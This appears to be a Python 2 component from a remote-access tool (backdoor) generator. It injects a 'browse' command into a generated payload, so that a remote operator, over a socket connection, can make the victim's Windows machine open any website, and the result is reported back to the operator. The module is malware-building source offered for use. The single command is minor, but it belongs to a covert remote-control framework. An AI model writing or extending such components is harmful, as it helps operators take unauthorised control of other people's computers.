# verified
import library.modules.config as config

config.main()


def main(option):
    if option == 'generate':
        config.import_statements.append('import webbrowser')
        config.functions.append('''
def browse(site):
    open_bool = webbrowser.open(site)
    if open_bool:
        s.sendall('[+]Opened site : ' + site)
    else:
        s.sendall('[-]Could not open site : ' + site)''')
        config.logics.append('''
            elif command == "browse":
                browse(data)''')
    elif option == 'info':
        print '\nName             : Browse component' \
              '\nOS               : Windows' \
              '\nRequired Modules : webbrowser' \
              '\nCommands         : browse <site>' \
              '\nDescription      : Opens a new browser to the specified site\n'
